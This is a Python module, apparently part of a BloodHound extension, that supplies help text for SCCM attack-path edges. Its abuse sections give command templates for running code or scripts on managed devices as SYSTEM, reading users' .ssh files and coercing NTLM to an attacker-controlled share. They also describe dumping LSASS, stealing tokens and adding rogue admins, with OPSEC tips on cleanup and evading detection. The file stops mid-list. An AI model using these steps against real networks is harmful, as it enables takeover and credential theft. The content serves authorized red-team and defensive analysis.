"""Per-edge entity-panel help content for SCCM edges.

BloodHound renders an edge's properties in its entity panel but ships no native
help (General / Windows Abuse / Linux Abuse / OPSEC / References) for OpenGraph
custom edges. We supply that content as properties on each edge: this module maps
an edge kind to a self-contained `EdgeHelp` block, and `models/graph_edge.py`
merges the matching block into the edge's property bag.

Each block is authored independently (no shared/templated prose) so an operator
sees guidance specific to the exact edge they clicked. Kinds BloodHound already
documents natively (MemberOf, AdminTo, HasSession) are deliberately absent.
"""
from dataclasses import asdict, dataclass
from typing import Any

from .kinds import edges as ek


@dataclass(frozen=True)
class EdgeHelp:
    """One edge kind's entity-panel help content.

    Attributes:
        general: What the edge means and why it matters (the "General" tab).
        windowsAbuse: How to abuse it from a Windows host (the "Windows Abuse" tab),
            or None if there is nothing Windows-specific to say.
        linuxAbuse: How to abuse it from a Linux host (the "Linux Abuse" tab), or None.
        opsec: Detection / operational-security considerations (the "OPSEC" tab), or None.
        references: Source URLs shown under the "References" tab, or None.
    """
    general: str
    windowsAbuse: str | None = None
    linuxAbuse: str | None = None
    opsec: str | None = None
    references: list[str] | None = None

    def as_fields(self) -> dict[str, Any]:
        """Return only the non-None sections, keyed by their output property name.

        None sections are dropped here so they never reach the edge property bag;
        convert's null-pruning then keeps them off the emitted edge entirely.
        """
        return {k: v for k, v in asdict(self).items() if v is not None}


# Authored blocks, keyed by the edge-kind constants from kinds/edges.py so a renamed
# kind fails at import instead of silently dropping content. Add a block here (and
# remove the kind from PENDING_HELP_KINDS) as each one is written.
EDGE_HELP: dict[str, EdgeHelp] = {
    ek.SCCM_ADMINS_REPLICATED_TO: EdgeHelp(
        general=(
            "SCCM security roles assigned to users are replicated to every other site "
            "in the hierarchy. As a result, an administrative user created and/or granted "
            "permissions in one site will have the same permissions in every other site in "
            "the hierarchy. An attacker with control of any site gains control of every "
            "site in the hierarchy and as a result, control of every client device managed "
            "by the hierarchy."
        ),
        windowsAbuse=(
            "There is no specific abuse required to follow this attack path. As SCCM admin "
            "users are replicated between sites in the same hierarchy by design, an admin "
            "user created in any site in the hierarchy will have the same permissions in "
            "every other site in the hierarchy.\n"
            "To leverage SCCM administrative user permissions from a Windows machine, "
            "execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> "
            "-sc <site_code>` or leverage the Microsoft Configuration Manager Console "
            "software in the context of the admin user to connect to an SMS Provider for "
            "any site in the hierarchy."
        ),
        linuxAbuse=(
            "There is no specific abuse required to follow this attack path. As SCCM admin "
            "users are replicated between sites in the same hierarchy by design, an admin "
            "user created in any site in the hierarchy will have the same permissions in "
            "every other site in the hierarchy.\n"
            "To leverage SCCM administrative user permissions from a Linux machine, execute "
            "`python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` "
            "to connect to an SMS Provider for any site in the hierarchy."
        ),
        opsec=(
            "An EDR product may detect your attempt to run SharpSCCM and alert a SOC "
            "analyst. Proxying in SCCMHunter or the Configuration Manager Console software "
            "are less likely to be detected. Most actions in SCCM are logged to files in "
            "C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs "
            "are primarily for diagnostics/troubleshooting and it is uncommon for them to be "
            "forwarded to a SIEM. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration",
            "https://posts.specterops.io/sccm-hierarchy-takeover-41929c61e087",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://github.com/garrettfoster13/sccmhunter/wiki",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-file",
        ],
    ),
    ek.SCCM_HAS_CLIENT: EdgeHelp(
        general=(
            "Control of a client device via SCCM may allow deployment of an application "
            "or package, PowerShell execution, authentication coercion, or read access to "
            "any data on the device.\n"
            "This edge is itself evidence that SCCM manages the device: either an "
            "AdminService/WMI-confirmed client record, or, without that privilege, a "
            "device inferred solely from the CmRcService service-principal-name "
            "registered on the computer's AD object (a possible client device). False "
            "positive: CmRcService can remain registered on a computer that was "
            "decommissioned as an SCCM client without the SPN being cleaned up, so a "
            "possible client device is weaker evidence than a directly enumerated one, "
            "and it is not produced when possible-edge collection is turned off."
        ),
        windowsAbuse=(
            "To execute an application on an SCCM client device from Windows, host an "
            "executable on a file share or path that is accessible from the target client "
            "device, for example using the `python3 smbserver.py <name_for_share> "
            "<local_path_to_share>` Impacket script or a file share on a distribution point.\n"
            "Next, execute `SharpSCCM.exe get devices -n <client_device_name> -sms "
            "<sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to "
            "connect to an SMS Provider for any site in the hierarchy, search for a client "
            "device by name, and obtain its resource ID.\n"
            "Then, execute `SharpSCCM.exe exec -rid <resource_id> -p "
            "<unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the "
            "application. In very large environments, it may be necessary to increase the "
            "wait time to ensure the application executes before automated cleanup using the "
            "`-w <seconds>` option.\n"
            "By default, SharpSCCM will execute the application in the context of the user "
            "who is currently logged in to the client device, or the `-s` flag can be added "
            "to the command to execute the application as SYSTEM. If the UNC path of the "
            "application is set to an attacker-controlled IP address or NetBIOS name and "
            "port, that user will authenticate to the attacker server via NTLM, allowing the "
            "credentials to be cracked or relayed.\n"
            "To use CMPivot, which allows read access to client devices, including their "
            "file systems, registry, users and groups, and event logs, execute "
            "`SharpSCCM.exe invoke admin-service -q <kql_query> [-r <resource_id>|-i "
            "<collection_id>]`. For example, the KQL query "
            "`\"File('C:\\Users\\*\\.ssh\\*')\"` will list files discovered in any user's "
            "`.ssh` directory, after which the `\"FileContent('<path>')\"` KQL query can be "
            "used to read a file's contents.\n"
            "Please refer to the References section for additional abuse primitives, tools, "
            "and resources."
        ),
        linuxAbuse=(
            "To execute PowerShell on an SCCM client device from Linux, execute `python3 "
            "sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to "
            "connect to an SMS Provider for any site in the hierarchy, then execute the "
            "`get_device <name>` or `get_puser <name>` command to identify the target client "
            "device's resource ID.\n"
            "Next, execute the `interact <resource_id>` command followed by `script "
            "<local_path_to_ps1>` to execute a PowerShell script on the client device.\n"
            "Please refer to the References section for additional abuse primitives, tools, "
            "and resources."
        ),
        opsec=(
            "If possible, use the Microsoft Configuration Manager Console software in the "
            "context of an existing SCCM administrator account to execute actions that "
            "create logs that blend in with normal SCCM operations.\n"
            "It is common (and recommended by Microsoft) for the directories where "
            "PowerShell scripts are executed to be allow-listed in antivirus/EDR software on "
            "client devices. In addition, SCCMHunter automatically deletes PowerShell "
            "scripts after execution.\n"
            "By default, SharpSCCM hides created applications from the Configuration Manager "
            "Console and automatically deletes created objects after execution on client "
            "devices.\n"
            "Object creation, deletion, and CMPivot execution events are logged in "
            "diagnostic status messages in SCCM, although it is uncommon for these logs to "
            "be forwarded to a SIEM. Modify hardcoded values in offensive tooling to help "
            "avoid brittle detections based on pattern matching. Ensure that objects created "
            "manually in SCCM are deleted after use (e.g., using the SharpSCCM `remove` "
            "subcommand)."
        ),
        references=[
            "https://github.com/fortra/impacket/blob/master/examples/smbserver.py",
            "https://github.com/Mayyhem/SharpSCCM/wiki/get#get-devices",
            "https://github.com/Mayyhem/SharpSCCM/wiki/exec",
            "https://github.com/Mayyhem/SharpSCCM/wiki/invoke#invoke-admin-service",
            "https://github.com/garrettfoster13/sccmhunter/wiki/admin#using-the-admin-module",
            "https://github.com/garrettfoster13/sccmhunter/wiki/admin#script",
            "https://medium.com/specter-ops-posts/further-adventures-with-cmpivot-client-coercion-38b878b740ac",
            "https://github.com/Mayyhem/SharpSCCM/wiki/remove",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_IS_ASSIGNED: EdgeHelp(
        general=(
            "This indicates that the SCCM administrative user is assigned a security role "
            "or collection. Administrative users are granted permissions (e.g., \"Run "
            "Scripts\") via their security role assignments and can use those permissions to "
            "interact with client devices and users within the collections they are assigned."
        ),
        windowsAbuse=(
            "There is no specific abuse for this edge. SCCM administrators who are assigned a "
            "collection can perform actions on client devices and users within the collection "
            "that are permitted by their assigned security roles."
        ),
        linuxAbuse=(
            "There is no specific abuse for this edge. SCCM administrators who are assigned a "
            "collection can perform actions on client devices and users within the collection "
            "that are permitted by their assigned security roles."
        ),
        opsec="There are no OPSEC considerations related to this edge.",
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/clients/manage/collections/introduction-to-collections",
        ],
    ),
    ek.SCCM_ASSIGN_ALL_PERMISSIONS: EdgeHelp(
        general=(
            "The source principal can grant all permissions in SCCM, allowing complete "
            "control of the hierarchy and its managed client devices.\n"
            "This edge is built for two different structural reasons, not one template: "
            "a domain computer discovered hosting the SMS Provider role (confirmed from "
            "the RemoteRegistry SMS Provider key, an anonymous HTTP AdminService probe, "
            "or LDAP management-point capabilities) can grant all permissions in every "
            "primary site it reaches, and the SCCM site database itself can grant all "
            "permissions in its own site because the site's RBAC lives in that "
            "database's tables. The SMS Provider variant is measured directly from the "
            "observed role tag and site hierarchy, so it appears the same way at every "
            "collection privilege level. The site-database variant is only as strong as "
            "how that host was identified: solid when RemoteRegistry, AdminService, or "
            "WMI directly confirmed it is the site database; an assumption, tagged as "
            "such, when the host was instead inferred from an MSSQLSvc service "
            "principal name plus its co-location with other SCCM roles, with nothing "
            "confirming it is THIS site's database rather than an unrelated SQL Server."
        ),
        windowsAbuse=(
            "The abuse for this edge is dependent on the source principal type.\n"
            "Site database: This node represents an SCCM site database, which holds the "
            "site's RBAC. Anyone who can access the database (for example, running as "
            "`LocalSystem` on the database server, or after dumping the SQL service account's "
            "credentials and impersonating a database administrator to the MSSQL service) can "
            "grant an arbitrary user any security role and collection. Please refer to the "
            "Misconfiguration Manager TAKEOVER-2 technique in the References section for more "
            "information.\n"
            "SMS Provider: This computer hosts a WMI provider and the AdminService REST API "
            "that can be used to grant an arbitrary user any security role and collection. "
            "Please refer to the Misconfiguration Manager TAKEOVER-5 and TAKEOVER-6 "
            "techniques in the References section for more information."
        ),
        linuxAbuse=(
            "The abuse for this edge is dependent on the source principal type.\n"
            "Site database: This node represents an SCCM site database, which holds the "
            "site's RBAC. Anyone who can access the database (for example, running as "
            "`LocalSystem` on the database server, or after dumping the SQL service account's "
            "credentials and impersonating a database administrator to the MSSQL service) can "
            "grant an arbitrary user any security role and collection. Please refer to the "
            "Misconfiguration Manager TAKEOVER-2 technique in the References section for more "
            "information.\n"
            "SMS Provider: This computer hosts a WMI provider and the AdminService REST API "
            "that can be used to grant an arbitrary user any security role and collection. "
            "Please refer to the Misconfiguration Manager TAKEOVER-5 and TAKEOVER-6 "
            "techniques in the References section for more information."
        ),
        opsec=(
            "Creation of new SCCM admin users is a detectable event and will be visible to "
            "legitimate SCCM admins in the console. It is also possible to access the site "
            "database and swap the SID of an existing user with an attacker-controlled SID. "
            "However, the legitimate user will lose access. The site-database variant of "
            "this edge may be wrong if the co-located SQL Server it was templated from "
            "later turns out not to be the site database; verify with a direct connection "
            "before acting on it."
        ),
        references=[
            "https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/TAKEOVER/_takeover-techniques-list.md",
            "https://github.com/garrettfoster13/sccmhunter/wiki/admin#add_admin",
            "https://www.oscc.be/sccm/Defending-the-Castle/",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_ALL_PERMISSIONS: EdgeHelp(
        general=(
            "The source SCCM administrative user has been granted the Full Administrator "
            "security role scoped to the \"All Systems\" and \"All Users and User Groups\" "
            "collections, giving it all permissions in SCCM and effective control of every "
            "site in the hierarchy and its managed client devices."
        ),
        windowsAbuse=(
            "To leverage these permissions from a Windows machine, execute "
            "`SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or "
            "use the Microsoft Configuration Manager Console software in the context of this "
            "admin user to connect to an SMS Provider for any site in the hierarchy. As a "
            "Full Administrator, this user can perform any SCCM action across the hierarchy, "
            "including deploying applications, running scripts on client devices, and granting "
            "the same permissions to arbitrary users with the `New-CMAdministrativeUser` "
            "Configuration Manager PowerShell cmdlet."
        ),
        linuxAbuse=(
            "To leverage these permissions from a Linux machine, execute "
            "`python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` "
            "to connect to an SMS Provider for any site in the hierarchy. As a Full "
            "Administrator, this user can perform any SCCM action across the hierarchy, "
            "including granting the same permissions to arbitrary users with the SCCMHunter "
            "`add_admin <user_name> <domain_sid>` command."
        ),
        opsec=(
            "An EDR product may detect your attempt to run SharpSCCM and alert a SOC analyst. "
            "Proxying in SCCMHunter or the Configuration Manager Console software are less "
            "likely to be detected. Creation of new SCCM admin users is a detectable event "
            "and will be visible to legitimate SCCM admins in the console. Most actions in "
            "SCCM are logged to files in C:\\Program Files\\Microsoft Configuration "
            "Manager\\Logs. However, these logs are primarily for diagnostics/troubleshooting "
            "and it is uncommon for them to be forwarded to a SIEM. For more information, see "
            "the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration",
            "https://learn.microsoft.com/en-us/powershell/module/configurationmanager/new-cmadministrativeuser",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://github.com/garrettfoster13/sccmhunter/wiki/admin#add_admin",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_IS_MAPPED_TO: EdgeHelp(
        general=(
            "The source user is mapped to the target administrative user in SCCM and can "
            "access SCCM resources based on its assigned security roles and device/user "
            "collections."
        ),
        windowsAbuse=(
            "To leverage SCCM administrative user permissions from a Windows machine, "
            "execute `SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> "
            "-sc <site_code>` or leverage the Microsoft Configuration Manager Console "
            "software in the context of the admin user to connect to an SMS Provider for "
            "any site in the hierarchy."
        ),
        linuxAbuse=(
            "To leverage SCCM administrative user permissions from a Linux machine, execute "
            "`python3 sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` "
            "to connect to an SMS Provider for any site in the hierarchy."
        ),
        opsec=(
            "An EDR product may detect your attempt to run SharpSCCM and alert a SOC "
            "analyst. Proxying in SCCMHunter or the Configuration Manager Console software "
            "are less likely to be detected. Most actions in SCCM are logged to files in "
            "C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs "
            "are primarily for diagnostics/troubleshooting and it is uncommon for them to be "
            "forwarded to a SIEM. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://github.com/garrettfoster13/sccmhunter/wiki",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_HAS_PRIMARY_USER: EdgeHelp(
        general=(
            "The target user is a primary user on the source SCCM client device. In SCCM, "
            "primary users are determined by user device affinity relationships, which can be "
            "created manually by an SCCM administrator or automatically based on usage "
            "(48 hours over 30 days by default). There is a high likelihood that this user "
            "has a session on this client device.\n"
            "When a user authenticates to a computer, they often leave credentials exposed on "
            "the system, which can be retrieved through LSASS injection, token "
            "manipulation/theft, or injecting into a user's process.\n"
            "Any user that is an administrator to the system has the capability to retrieve "
            "the credential material from memory if it still exists.\n"
            "Note: A session does not guarantee credential material is present, only possible."
        ),
        windowsAbuse=(
            "If the target user has a logon session on the source computer, you may be able "
            "to recover that user's credential material or impersonate their session from the "
            "computer. This requires that you can reach the computer, that you have "
            "administrative (or SYSTEM) rights on it, and that the user has an interactive "
            "(non-network) logon session there.\n"
            "Given that access, a logged-on user's credentials can typically be obtained by "
            "dumping them from the memory of the Local Security Authority process (LSASS), by "
            "stealing or impersonating the user's access token to act as them against other "
            "systems, or by capturing what the user types or copies (for example, keylogging "
            "or clipboard capture). Whether any of these succeeds depends on the user's logon "
            "type, how recently they authenticated, and the host's protections (such as LSASS "
            "protection, Credential Guard, or an EDR product). See the References tab for "
            "current techniques and tooling.\n"
            "This data reflects only what was true at the time of collection, so the user may "
            "have logged off by the time you reach the computer. Because people tend to reuse "
            "the same machines for their day-to-day work, it is often worth checking more than "
            "once for the session to return."
        ),
        opsec=(
            "An EDR product may detect your attempt to inject into lsass and alert a SOC "
            "analyst. There are many more opsec considerations to keep in mind when stealing "
            "credentials or tokens. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/apps/deploy-use/link-users-and-devices-with-user-device-affinity",
            "https://attack.mitre.org/tactics/TA0006/",
            "https://attack.mitre.org/techniques/T1003/",
            "https://attack.mitre.org/techniques/T1134/",
            "https://attack.mitre.org/techniques/T1056/001/",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_HAS_CURRENT_USER: EdgeHelp(
        general=(
            "The last time this SCCM client contacted its management point (every 15 minutes "
            "by default), the target user was currently logged on to the source computer.\n"
            "When a user authenticates to a computer, they often leave credentials exposed on "
            "the system, which can be retrieved through LSASS injection, token "
            "manipulation/theft, or injecting into a user's process.\n"
            "Any user that is an administrator to the system has the capability to retrieve "
            "the credential material from memory if it still exists.\n"
            "Note: A session does not guarantee credential material is present, only possible."
        ),
        windowsAbuse=(
            "If the target user has a logon session on the source computer, you may be able "
            "to recover that user's credential material or impersonate their session from the "
            "computer. This requires that you can reach the computer, that you have "
            "administrative (or SYSTEM) rights on it, and that the user has an interactive "
            "(non-network) logon session there.\n"
            "Given that access, a logged-on user's credentials can typically be obtained by "
            "dumping them from the memory of the Local Security Authority process (LSASS), by "
            "stealing or impersonating the user's access token to act as them against other "
            "systems, or by capturing what the user types or copies (for example, keylogging "
            "or clipboard capture). Whether any of these succeeds depends on the user's logon "
            "type, how recently they authenticated, and the host's protections (such as LSASS "
            "protection, Credential Guard, or an EDR product). See the References tab for "
            "current techniques and tooling.\n"
            "This data reflects only what was true at the time of collection, so the user may "
            "have logged off by the time you reach the computer. Because people tend to reuse "
            "the same machines for their day-to-day work, it is often worth checking more than "
            "once for the session to return."
        ),
        opsec=(
            "An EDR product may detect your attempt to inject into lsass and alert a SOC "
            "analyst. There are many more opsec considerations to keep in mind when stealing "
            "credentials or tokens. For more information, see the References tab."
        ),
        references=[
            "https://techcommunity.microsoft.com/blog/configurationmanagerarchive/fast-channel-for-system-management---client-notification-in-system-center-2012-c/273157",
            "https://attack.mitre.org/tactics/TA0006/",
            "https://attack.mitre.org/techniques/T1003/",
            "https://attack.mitre.org/techniques/T1134/",
            "https://attack.mitre.org/techniques/T1056/001/",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_HAS_AD_LAST_LOGON_USER: EdgeHelp(
        general=(
            "The last time SCCM conducted Active Directory discovery (every 5 minutes by "
            "default), the target user was the last to log on to the source computer.\n"
            "When a user authenticates to a computer, they often leave credentials exposed on "
            "the system, which can be retrieved through LSASS injection, token "
            "manipulation/theft, or injecting into a user's process.\n"
            "Any user that is an administrator to the system has the capability to retrieve "
            "the credential material from memory if it still exists.\n"
            "Note: A session does not guarantee credential material is present, only possible."
        ),
        windowsAbuse=(
            "If the target user has a logon session on the source computer, you may be able "
            "to recover that user's credential material or impersonate their session from the "
            "computer. This requires that you can reach the computer, that you have "
            "administrative (or SYSTEM) rights on it, and that the user has an interactive "
            "(non-network) logon session there.\n"
            "Given that access, a logged-on user's credentials can typically be obtained by "
            "dumping them from the memory of the Local Security Authority process (LSASS), by "
            "stealing or impersonating the user's access token to act as them against other "
            "systems, or by capturing what the user types or copies (for example, keylogging "
            "or clipboard capture). Whether any of these succeeds depends on the user's logon "
            "type, how recently they authenticated, and the host's protections (such as LSASS "
            "protection, Credential Guard, or an EDR product). See the References tab for "
            "current techniques and tooling.\n"
            "This data reflects only what was true at the time of collection, so the user may "
            "have logged off by the time you reach the computer. Because people tend to reuse "
            "the same machines for their day-to-day work, it is often worth checking more than "
            "once for the session to return."
        ),
        opsec=(
            "An EDR product may detect your attempt to inject into lsass and alert a SOC "
            "analyst. There are many more opsec considerations to keep in mind when stealing "
            "credentials or tokens. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/servers/deploy/configure/about-discovery-methods#bkmk_aboutSystem",
            "https://attack.mitre.org/tactics/TA0006/",
            "https://attack.mitre.org/techniques/T1003/",
            "https://attack.mitre.org/techniques/T1134/",
            "https://attack.mitre.org/techniques/T1056/001/",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_FULL_ADMINISTRATOR: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Full Administrator security "
            "role and is assigned a collection containing the target client device, allowing "
            "the user to execute all SCCM actions against the device.\n"
            "Control of a client device via SCCM allows deployment of an application or "
            "package, PowerShell execution, authentication coercion, or read access to any "
            "data on the device.\n"
            "The Full Administrator security role also allows assignment of any security role "
            "to new or existing administrative users, limited to the collections the source "
            "user is assigned."
        ),
        windowsAbuse=(
            "To leverage SCCM administrative user permissions from a Windows machine, execute "
            "`SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or "
            "leverage the Microsoft Configuration Manager Console software in the context of "
            "the admin user to connect to an SMS Provider for any site in the hierarchy.\n"
            "To execute an application on an SCCM client device from Windows, host an "
            "executable on a file share or path that is accessible from the target client "
            "device, for example using the `python3 smbserver.py <name_for_share> "
            "<local_path_to_share>` Impacket script or a file share on a distribution point.\n"
            "Next, execute `SharpSCCM.exe get devices -n <client_device_name> -sms "
            "<sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to "
            "connect to an SMS Provider for any site in the hierarchy, search for a client "
            "device by name, and obtain its resource ID.\n"
            "Then, execute `SharpSCCM.exe exec -rid <resource_id> -p "
            "<unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the "
            "application. In very large environments, it may be necessary to increase the "
            "wait time to ensure the application executes before automated cleanup using the "
            "`-w <seconds>` option.\n"
            "By default, SharpSCCM will execute the application in the context of the user "
            "who is currently logged in to the client device, or the `-s` flag can be added "
            "to the command to execute the application as SYSTEM. If the UNC path of the "
            "application is set to an attacker-controlled IP address or NetBIOS name and "
            "port, that user will authenticate to the attacker server via NTLM, allowing the "
            "credentials to be cracked or relayed.\n"
            "To use CMPivot, which allows read access to client devices, including their "
            "file systems, registry, users and groups, and event logs, execute "
            "`SharpSCCM.exe invoke admin-service -q <kql_query> [-r <resource_id>|-i "
            "<collection_id>]`. For example, the KQL query "
            "`\"File('C:\\Users\\*\\.ssh\\*')\"` will list files discovered in any user's "
            "`.ssh` directory, after which the `\"FileContent('<path>')\"` KQL query can be "
            "used to read a file's contents.\n"
            "Please refer to the References section for additional abuse primitives, tools, "
            "and resources."
        ),
        linuxAbuse=(
            "To execute PowerShell on an SCCM client device from Linux, execute `python3 "
            "sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to "
            "connect to an SMS Provider for any site in the hierarchy, then execute the "
            "`get_device <name>` or `get_puser <name>` command to identify the target client "
            "device's resource ID.\n"
            "Next, execute the `interact <resource_id>` command followed by `script "
            "<local_path_to_ps1>` to execute a PowerShell script on the client device.\n"
            "Please refer to the References section for additional abuse primitives, tools, "
            "and resources."
        ),
        opsec=(
            "An EDR product may detect your attempt to run SharpSCCM and alert a SOC "
            "analyst. Proxying in SCCMHunter or the Configuration Manager Console software "
            "are less likely to be detected. Most actions in SCCM are logged to files in "
            "C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs "
            "are primarily for diagnostics/troubleshooting and it is uncommon for them to be "
            "forwarded to a SIEM. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://github.com/garrettfoster13/sccmhunter/wiki",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_OPERATIONS_ADMINISTRATOR: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Operations Administrator "
            "security role and is assigned a collection containing the target client device, "
            "allowing the user to execute all SCCM actions against the device. This security "
            "role has all permissions in SCCM with the exception of those required to manage "
            "security, including administrative user creation and security role, security "
            "scope, and collection assignments.\n"
            "Control of a client device via SCCM allows deployment of an application or "
            "package, PowerShell execution, authentication coercion, or read access to any "
            "data on the device."
        ),
        windowsAbuse=(
            "To leverage SCCM administrative user permissions from a Windows machine, execute "
            "`SharpSCCM.exe <command> <subcommand> -sms <sms_provider_ip> -sc <site_code>` or "
            "leverage the Microsoft Configuration Manager Console software in the context of "
            "the admin user to connect to an SMS Provider for any site in the hierarchy.\n"
            "To execute an application on an SCCM client device from Windows, host an "
            "executable on a file share or path that is accessible from the target client "
            "device, for example using the `python3 smbserver.py <name_for_share> "
            "<local_path_to_share>` Impacket script or a file share on a distribution point.\n"
            "Next, execute `SharpSCCM.exe get devices -n <client_device_name> -sms "
            "<sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to "
            "connect to an SMS Provider for any site in the hierarchy, search for a client "
            "device by name, and obtain its resource ID.\n"
            "Then, execute `SharpSCCM.exe exec -rid <resource_id> -p "
            "<unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the "
            "application. In very large environments, it may be necessary to increase the "
            "wait time to ensure the application executes before automated cleanup using the "
            "`-w <seconds>` option.\n"
            "By default, SharpSCCM will execute the application in the context of the user "
            "who is currently logged in to the client device, or the `-s` flag can be added "
            "to the command to execute the application as SYSTEM. If the UNC path of the "
            "application is set to an attacker-controlled IP address or NetBIOS name and "
            "port, that user will authenticate to the attacker server via NTLM, allowing the "
            "credentials to be cracked or relayed.\n"
            "To use CMPivot, which allows read access to client devices, including their "
            "file systems, registry, users and groups, and event logs, execute "
            "`SharpSCCM.exe invoke admin-service -q <kql_query> [-r <resource_id>|-i "
            "<collection_id>]`. For example, the KQL query "
            "`\"File('C:\\Users\\*\\.ssh\\*')\"` will list files discovered in any user's "
            "`.ssh` directory, after which the `\"FileContent('<path>')\"` KQL query can be "
            "used to read a file's contents.\n"
            "Please refer to the References section for additional abuse primitives, tools, "
            "and resources."
        ),
        linuxAbuse=(
            "To execute PowerShell on an SCCM client device from Linux, execute `python3 "
            "sccmhunter.py admin -u <username> -p <password> -ip <sms_provider_ip>` to "
            "connect to an SMS Provider for any site in the hierarchy, then execute the "
            "`get_device <name>` or `get_puser <name>` command to identify the target client "
            "device's resource ID.\n"
            "Next, execute the `interact <resource_id>` command followed by `script "
            "<local_path_to_ps1>` to execute a PowerShell script on the client device.\n"
            "Please refer to the References section for additional abuse primitives, tools, "
            "and resources."
        ),
        opsec=(
            "An EDR product may detect your attempt to run SharpSCCM and alert a SOC "
            "analyst. Proxying in SCCMHunter or the Configuration Manager Console software "
            "are less likely to be detected. Most actions in SCCM are logged to files in "
            "C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs "
            "are primarily for diagnostics/troubleshooting and it is uncommon for them to be "
            "forwarded to a SIEM. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://github.com/garrettfoster13/sccmhunter/wiki",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
        ],
    ),
    ek.SCCM_APPLICATION_ADMINISTRATOR: EdgeHelp(
        general=(
            "The source SCCM administrative user is assigned the Application Administrator "
            "security role and is assigned a collection containing the target client device, "
            "allowing the user to deploy an application to the device."
        ),
        windowsAbuse=(
            "To execute an application on an SCCM client device from Windows, host an "
            "executable on a file share or path that is accessible from the target client "
            "device, for example using the `python3 smbserver.py <name_for_share> "
            "<local_path_to_share>` Impacket script or a file share on a distribution point.\n"
            "Next, execute `SharpSCCM.exe get devices -n <client_device_name> -sms "
            "<sms_provider_ip> -sc <site_code>` in the context of an SCCM admin user to "
            "connect to an SMS Provider for any site in the hierarchy, search for a client "
            "device by name, and obtain its resource ID.\n"
            "Then, execute `SharpSCCM.exe exec -rid <resource_id> -p "
            "<unc_path_to_executable> -sms <sms_provider_ip> -sc <site_code>` to launch the "
            "application. In very large environments, it may be necessary to increase the "
            "wait time to ensure the application executes before automated cleanup using the "
            "`-w <seconds>` option.\n"
            "By default, SharpSCCM will execute the application in the context of the user "
            "who is currently logged in to the client device, or the `-s` flag can be added "
            "to the command to execute the application as SYSTEM. If the UNC path of the "
            "application is set to an attacker-controlled IP address or NetBIOS name and "
            "port, that user will authenticate to the attacker server via NTLM, allowing the "
            "credentials to be cracked or relayed."
        ),
        linuxAbuse=(
            "There is no public Linux tooling to execute an application on an SCCM client "
            "device at the time of this writing. However, a SOCKS proxy can be used to follow "
            "the Windows Abuse noted above."
        ),
        opsec=(
            "An EDR product may detect your attempt to run SharpSCCM and alert a SOC "
            "analyst. Proxying in SCCMHunter or the Configuration Manager Console software "
            "are less likely to be detected. Most actions in SCCM are logged to files in "
            "C:\\Program Files\\Microsoft Configuration Manager\\Logs. However, these logs "
            "are primarily for diagnostics/troubleshooting and it is uncommon for them to be "
            "forwarded to a SIEM. For more information, see the References tab."
        ),
        references=[
            "https://learn.microsoft.com/en-us/intune/configmgr/core/understand/fundamentals-of-role-based-administration#security-roles",
            "https://github.com/Mayyhem/SharpSCCM/wiki",
            "https://learn.microsoft.com/en-us/intune/configmgr/core/plan-design/hierarchy/log-files",
